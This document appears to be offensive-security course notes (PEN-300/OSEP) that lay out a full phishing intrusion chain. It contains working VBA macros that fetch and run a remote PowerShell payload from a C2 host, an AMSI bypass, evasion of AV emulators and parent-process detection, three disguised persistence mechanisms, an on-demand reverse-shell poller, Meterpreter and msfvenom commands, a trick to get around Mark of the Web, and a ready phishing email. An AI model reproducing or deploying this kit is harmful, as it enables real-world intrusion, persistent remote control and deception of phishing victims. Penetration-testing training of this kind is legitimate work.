---
title: "PEN-300 / OSEP — AV-Evading Phishing Payload with Persistence and On-Demand Callback"
author: "Operator Notes"
date: "\\today"
geometry: margin=1in
fontsize: 10pt
---

# PEN-300 / OSEP Phishing Payload

**Objective:** Deliver an AV-evading Microsoft Office document via phishing that
establishes long-term remote access to a target workstation and provides an
operator-triggered reverse shell on demand from a Kali Linux C2 host.

**Course alignment:** PEN-300 Modules 4 (Phishing with Microsoft Office), 8
(Reflective PowerShell), 11 (Introduction to Antivirus Evasion), 24 (Combining
the Pieces).

---

## 1. Threat Model and Objectives

Assume an assumed-breach engagement scenario with a target user on a hardened
Windows 10/11 workstation running Windows Defender with AMSI enabled and
AppLocker configured for signed-only executables.

Required capabilities:

| Requirement | Technique |
|---|---|
| Initial execution | Malicious `.docm` delivered via phishing email |
| AV evasion on document | Caesar-ciphered shellcode + non-emulated API check |
| Execution context | PowerShell spawned from `WmiPrvSE.exe` (de-chained from Word) |
| Persistence across reboots | Registry Run key + Startup folder LNK |
| On-demand callback | Scheduled task polling an operator-controlled activation URL |
| Shell source | Kali `multi/handler` (HTTPS Meterpreter) |

The document itself is not the C2. It is the initial access vector. Persistence
and callback are handled by lightweight, fileless PowerShell stubs written to
the user's profile.

---

## 2. Architecture Overview

```
[Phishing Email]
      |
      v
[Malicious .docm] --- enables macro ---> [VBA]
      |                                    |
      |                                    +-> WMI Create -> PowerShell (de-chained)
      |                                    |        |
      |                                    |        +-> DownloadString(run.ps1) | IEX
      |                                    |                |
      |                                    |                +-> AMSI bypass
      |                                    |                +-> Reflective shellcode runner
      |                                    |
      |                                    +-> Registry Run key (persistence)
      |                                    +-> Startup folder LNK (persistence)
      |                                    +-> Scheduled task "OneDriveUpdate" (on-demand poller)
      |
      v
[Kali C2]  <---- HTTPS 443 ----   [Target]
   ^                                   ^
   |                                   |
   +---  every 5 min: GET /activate ---+
         (payload fires only if 200 OK)
```

Two distinct channels:

1. **Initial channel** — fired once when the document opens.
2. **On-demand channel** — polled every N minutes by a scheduled task. The
   operator flips a switch on the C2 (a file exists at `/activate`), and on the
   next poll the target establishes a fresh reverse shell.

The poll channel is what gives "long-term remote access on demand" without a
persistent beacon that would attract EDR attention.

---

## 3. The Word Document (Phishing Vector)

### 3.1 Pretext

A short, plausible business pretext. For OSEP-style engagements, examples:

- "Updated PTO policy — please review and acknowledge" (HR pretext)
- "Q4 vendor invoice — signature required" (finance pretext)
- "IT maintenance window — scheduled changes" (internal IT pretext)

The document contains a single paragraph of boilerplate and no obvious "enable
content" call to action beyond a normal-looking body. Protected View and MoTW
are addressed in delivery (Section 7).

### 3.2 VBA Macro

The macro is a two-stage design:

- **Stage 1 — Runner:** executes a PowerShell download cradle via WMI.
- **Stage 2 — Persistence:** writes the Run key, Startup LNK, and scheduled
  task, all as separate operations from the same macro entry point.

The VBA shellcode runner is *not* embedded in the document. Only the download
cradle and persistence setup are. This keeps the document's static signature
profile low and puts the ciphered shellcode in an external `run.ps1` on the
operator's Apache server, where it can be regenerated without re-delivering the
phishing email.

**Full VBA listing — `AutoOpen` + `Document_Open` entry points:**

```vba
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

' Called automatically when the document opens and macros are enabled.
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim strArg As String
    Dim t1 As Date, t2 As Date, timeDelta As Long

    ' --- Emulator detection: if the Sleep is fast-forwarded, bail. ---
    t1 = Now()
    Sleep (2000)
    t2 = Now()
    timeDelta = DateDiff("s", t1, t2)
    If timeDelta < 2 Then
        Exit Sub
    End If

    ' --- Stage 1: de-chained PowerShell download cradle via WMI ---
    ' Runs as a child of WmiPrvSE.exe, NOT of WINWORD.EXE.
    strArg = "powershell -exec bypass -nop -w hidden -c " & _
             "iex((new-object system.net.webclient)." & _
             "downloadstring('http://192.168.119.120/run.txt'))"
    GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid

    ' --- Stage 2: persistence ---
    Call PersistRunKey
    Call PersistStartupLink
    Call PersistScheduledTask
End Sub
```

### 3.3 Evasion Details

Three layers of evasion are applied:

1. **De-chaining (Mod 11.8.2)** — `GetObject("winmgmts:").Get("Win32_Process").Create`
   spawns the PowerShell process as a child of `WmiPrvSE.exe`, not
   `WINWORD.EXE`. Behavioral detection that flags "Office spawning PowerShell"
   is bypassed.

2. **Emulator detection (Mod 11.6.1)** — the `Sleep(2000)` + wall-clock check.
   AV heuristic emulators fast-forward through `Sleep`. If the elapsed time is
   less than two seconds, we bail and never drop shellcode.

3. **External ciphered shellcode (Mod 11.5.2)** — the shellcode in `run.txt` is
   Caesar-ciphered with a non-standard key and decrypted in-memory. The .docm
   carries no shellcode signature at all.

No `StrReverse` string obfuscation is used in the VBA — it's a well-known
malware flag. Instead, the download cradle's more sensitive fragments are
split across `& _` concatenations.

---

## 4. Persistence

Three independent persistence mechanisms are established. Redundancy matters:
any single mechanism may be remediated, but at least one survives typical
help-desk cleanup.

### 4.1 Registry Run Key

Writes a per-user Run key pointing at a hidden PowerShell one-liner that
re-downloads `run.txt` on every logon.

```vba
Sub PersistRunKey()
    Dim cmd As String
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")

    ' The Run value is the same download cradle, run hidden.
    cmd = "powershell -exec bypass -nop -w hidden -c " & _
          "iex((new-object system.net.webclient)." & _
          "downloadstring('http://192.168.119.120/run.txt'))"

    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync", _
                 cmd, "REG_SZ"
End Sub
```

Writing to `HKCU` does not require administrative privileges and survives normal
reboots. The value name `OneDriveSync` is chosen for camouflage in the
Registry Editor.

### 4.2 Startup Folder Shortcut

Writes a `.lnk` file to the user's Startup folder. The LNK target is the same
hidden PowerShell command.

```vba
Sub PersistStartupLink()
    Dim startup As String
    Dim sh As Object
    Dim lnk As Object

    startup = Environ("APPDATA") & "\Microsoft\Windows\Start Menu\Programs\Startup\"
    Set sh = CreateObject("WScript.Shell")
    Set lnk = sh.CreateShortcut(startup & "OneDrive Sync.lnk")

    lnk.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    lnk.Arguments = "-exec bypass -nop -w hidden -c " & _
                    "iex((new-object system.net.webclient)." & _
                    "downloadstring('http://192.168.119.120/run.txt'))"
    lnk.WindowStyle = 7           ' minimized
    lnk.Description = "OneDrive Sync"
    lnk.Save
End Sub
```

### 4.3 Scheduled Task (On-Demand Poller — See Section 5)

A scheduled task named `OneDriveUpdate` is created to run every 5 minutes.
This task is the on-demand callback mechanism itself; details in the next
section.

---

## 5. On-Demand Callback

The initial access channel fires once. The on-demand channel is what allows the
operator to pop a shell on the target at any point during the engagement —
without needing to re-phish, and without the target running a persistent
beacon that EDR would flag as anomalous.

### 5.1 The Activation Check

The scheduled task runs a small PowerShell one-liner every 5 minutes. It
requests a file from the C2 server at `/activate`. The server can be configured
to return 404 (target does nothing) or 200 (target fires a shell).

The logic:

```
if activation URL returns HTTP 200:
    download run.txt
    decrypt + execute shellcode
else:
    exit quietly
```

The activation URL is a small file the operator creates / removes on the Apache
web root. **This is the switch.** Present = shell fires. Absent = silence.

### 5.2 The Poller Script

Stored on disk as `%APPDATA%\Microsoft\OneDrive\update.ps1` (camouflaged path).
The scheduled task calls it.

```powershell
# %APPDATA%\Microsoft\OneDrive\update.ps1
$ErrorActionPreference = 'SilentlyContinue'

# --- Emulator check ---
$t1 = Get-Date
Start-Sleep -Seconds 2
$t2 = Get-Date
if (($t2 - $t1).TotalSeconds -lt 1.5) { exit }

# --- AMSI bypass (context-corruption, Mod 12.3.1) ---
$a = [Ref].Assembly.GetTypes()
ForEach ($b in $a) { if ($b.Name -like "*iUtils") { $c = $b } }
$d = $c.GetFields('NonPublic,Static')
ForEach ($e in $d) { if ($e.Name -like "*Context") { $f = $e } }
$g = $f.GetValue($null)
[IntPtr]$ptr = $g
[Int32[]]$buf = @(0)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

# --- Activation check ---
$activate = "http://192.168.119.120/activate"
try {
    $r = Invoke-WebRequest -Uri $activate -UseBasicParsing -TimeoutSec 10
    if ($r.StatusCode -ne 200) { exit }
} catch {
    exit
}

# --- Fire the shell ---
$runner = (New-Object System.Net.WebClient).DownloadString(
    'http://192.168.119.120/run.txt'
)
iex $runner
```

The AMSI bypass is applied *before* the download cradle, so the reflective
shellcode runner in `run.txt` runs unmolested even though the pattern is
signature-heavy.

### 5.3 Scheduled Task Creation (VBA)

Created once during initial document execution.

```vba
Sub PersistScheduledTask()
    Dim sh As Object
    Dim psPath As String
    Dim cmd As String

    Set sh = CreateObject("WScript.Shell")
    psPath = Environ("APPDATA") & "\Microsoft\OneDrive\update.ps1"

    ' Write the poller to disk (this is the only payload that touches disk).
    ' In a fully fileless variant, this can be replaced with a Base64-encoded
    ' -EncodedCommand embedded directly in the schtasks command line.
    Dim fso As Object, f As Object
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set f = fso.CreateTextFile(psPath, True)
    f.Write "(see body above)"
    f.Close

    ' Create the task: run every 5 minutes, hidden.
    cmd = "schtasks /create /tn OneDriveUpdate /tr " & _
          """powershell -exec bypass -nop -w hidden -File " & psPath & """" & _
          " /sc minute /mo 5 /f"
    sh.Run cmd, 0, False
End Sub
```

`/sc minute /mo 5` means every 5 minutes. The task is created in the current
user's context (no admin required) and does not trigger UAC.

### 5.4 Operator Workflow

From Kali:

```bash
# 1. Make sure handler is running
msfconsole -q -x "use exploit/multi/handler; \
  set payload windows/x64/meterpreter/reverse_https; \
  set LHOST 192.168.119.120; \
  set LPORT 443; \
  set ExitOnSession false; \
  exploit -j"

# 2. Enable callback (target fires within ~5 min)
sudo touch /var/www/html/activate

# 3. Wait for session, then disable the trigger
#    (so the task stops firing shells repeatedly)
sudo rm /var/www/html/activate
```

**This is the "on-demand" piece.** Shell fires only when the operator wants it.
Between activations, the target is dormant and produces no C2 traffic.

---

## 6. Kali-Side Setup

### 6.1 Apache Web Root Layout

```
/var/www/html/
├── activate                 # trigger file — presence = fire
├── run.txt                  # ciphered reflective PowerShell shellcode runner
└── (optional) decoy.html    # a generic "IT portal" page for cover
```

### 6.2 Generating the Ciphered Shellcode Runner

`run.txt` is a reflective PowerShell shellcode runner (Mod 8.2.3) with the
shellcode Caesar-ciphered. Generating it:

```bash
# Generate raw shellcode
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.119.120 LPORT=443 \
    EXITFUNC=thread -f ps1 -o raw.txt

# Encrypt the shellcode (Caesar +5). Do this on a helper Windows box
# using the encoder from Mod 11.5.2, or with a quick Python script:

python3 - <<'EOF'
import re, sys
with open('raw.txt') as f:
    data = f.read()
# extract hex byte array from ps1 format
nums = re.findall(r'0x([0-9a-fA-F]{2})', data)
enc = [ (int(n,16) + 5) & 0xFF for n in nums ]
print('[Byte[]] $buf = ' + ','.join(f'0x{b:02x}' for b in enc))
EOF
```

Wrap the result in the reflective runner (LookupFunc + getDelegateType +
VirtualAlloc + CreateThread + WaitForSingleObject), then prepend the same AMSI
bypass used in the poller.

### 6.3 Handler Configuration

For OSEP-grade evasion, configure the handler with a benign-looking certificate
(Mod 14.3.1) and a StageEncoder:

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set LHOST 192.168.119.120
msf6 exploit(multi/handler) > set LPORT 443
msf6 exploit(multi/handler) > set HandlerSSLCert /home/kali/self_cert/nasa.pem
msf6 exploit(multi/handler) > set EnableStageEncoding true
msf6 exploit(multi/handler) > set StageEncoder x64/zutto_dekiru
msf6 exploit(multi/handler) > set ExitOnSession false
msf6 exploit(multi/handler) > exploit -j
```

Stage encoding is critical against Windows Defender's `WdNisSvc` network
inspection, which flags the default staged Meterpreter signature (Mod 24.3.1).

---

## 7. Delivery / Phishing Pretext

### 7.1 Bypassing Mark of the Web (Mod 4.1.2)

Deliver the `.docm` inside a password-protected ZIP. Most extraction tools do
not propagate MoTW through an encrypted archive. Zip with the archive itself
being the only MoTW-tagged file.

```bash
7z a -p"invoice2024" -mhe=on -tzip Q4_Invoice.zip Q4_Invoice.docm
```

The password is included in the phishing email as a "security measure." This
pattern is used heavily by real-world campaigns (Qakbot, Emotet) precisely
because it defeats MoTW propagation.

### 7.2 Email Body Pretext

Short, internal, plausible. Example for a finance pretext:

> **From:** accounts@<lookalike-domain>
> **Subject:** Q4 Invoice — Signature Required
>
> Hi,
>
> Attached is the Q4 vendor invoice that came back unsigned. Please review and
> return signed by EOD. The ZIP is password-protected per our new policy —
> password is `invoice2024`.
>
> Thanks,
> Accounts Payable

Lookalike domain (typosquat or homoglyph). SPF/DKIM/DMARC must be considered
on the operational side — out of scope for this document.

### 7.3 Delivery Notes

- Do not include tracking pixels or external images — Defender flags them.
- The email itself should be plain-text or minimal HTML.
- If using `sendEmail`, plain text + attachment only.

---

## 8. Cleanup and Opsec

Before engagement close:

```powershell
# On target (requires the operator's SYSTEM or user session):
Remove-Item "$env:APPDATA\Microsoft\OneDrive\update.ps1"
Remove-Item "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\OneDrive Sync.lnk"
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name OneDriveSync
schtasks /delete /tn OneDriveUpdate /f
```

Also check:

- Prefetch artifacts for `WINWORD.EXE`, `powershell.exe`, `schtasks.exe`
- RecentDocs registry for the `.docm` filename
- AmCache / ShimCache entries
- Windows Event Log entries for schtasks creation (Sysmon event 1)
- IIS/Exchange transport logs on the mail side

Real engagements require that the artifact list be documented *before* the
engagement starts, and cleanup be verified at close.

---

## Appendix A — Full VBA Listing

```vba
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim strArg As String
    Dim t1 As Date, t2 As Date, timeDelta As Long
    Dim pid As Long

    t1 = Now()
    Sleep (2000)
    t2 = Now()
    timeDelta = DateDiff("s", t1, t2)
    If timeDelta < 2 Then Exit Sub

    ' Stage 1: de-chained PowerShell via WMI
    strArg = "powershell -exec bypass -nop -w hidden -c " & _
             "iex((new-object system.net.webclient)." & _
             "downloadstring('http://192.168.119.120/run.txt'))"
    GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid

    ' Stage 2: persistence
    Call PersistRunKey
    Call PersistStartupLink
    Call PersistScheduledTask
End Sub

Sub PersistRunKey()
    Dim cmd As String
    Dim sh As Object
    Set sh = CreateObject("WScript.Shell")
    cmd = "powershell -exec bypass -nop -w hidden -c " & _
          "iex((new-object system.net.webclient)." & _
          "downloadstring('http://192.168.119.120/run.txt'))"
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OneDriveSync", _
                 cmd, "REG_SZ"
End Sub

Sub PersistStartupLink()
    Dim startup As String
    Dim sh As Object, lnk As Object
    startup = Environ("APPDATA") & _
              "\Microsoft\Windows\Start Menu\Programs\Startup\"
    Set sh = CreateObject("WScript.Shell")
    Set lnk = sh.CreateShortcut(startup & "OneDrive Sync.lnk")
    lnk.TargetPath = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
    lnk.Arguments = "-exec bypass -nop -w hidden -c " & _
                    "iex((new-object system.net.webclient)." & _
                    "downloadstring('http://192.168.119.120/run.txt'))"
    lnk.WindowStyle = 7
    lnk.Description = "OneDrive Sync"
    lnk.Save
End Sub

Sub PersistScheduledTask()
    Dim sh As Object
    Dim psPath As String, cmd As String
    Dim fso As Object, f As Object

    Set sh = CreateObject("WScript.Shell")
    Set fso = CreateObject("Scripting.FileSystemObject")

    psPath = Environ("APPDATA") & "\Microsoft\OneDrive\update.ps1"

    ' Poller body — writes to disk. Replace with -EncodedCommand inline
    ' for a fully fileless variant.
    Set f = fso.CreateTextFile(psPath, True)
    f.Write "(poller body — see Section 5.2)"
    f.Close

    cmd = "schtasks /create /tn OneDriveUpdate /tr " & _
          """powershell -exec bypass -nop -w hidden -File " & psPath & """" & _
          " /sc minute /mo 5 /f"
    sh.Run cmd, 0, False
End Sub
```

## Appendix B — PDF Conversion

Convert this document to PDF with Pandoc. On Kali:

```bash
sudo apt install pandoc texlive-latex-base texlive-fonts-recommended \
                 texlive-latex-extra texlive-latex-recommended

pandoc osep-phish-payload.md \
    -o osep-phish-payload.pdf \
    --pdf-engine=pdflatex \
    --highlight-style=tango \
    --toc \
    --toc-depth=3 \
    -V colorlinks=true \
    -V linkcolor=blue \
    -V urlcolor=blue
```

For tighter margin control, add `-V geometry:margin=1in` (already set in the
YAML front matter, but Pandoc prefers CLI overrides). For a smaller file size
and better code-block rendering, use `--pdf-engine=xelatex` instead and add
`-V mainfont="DejaVu Sans Mono"` for the code face.

Verify the output:

```bash
pdfinfo osep-phish-payload.pdf
```

Expect a ~15–20 page document depending on the code block line-wrap settings.
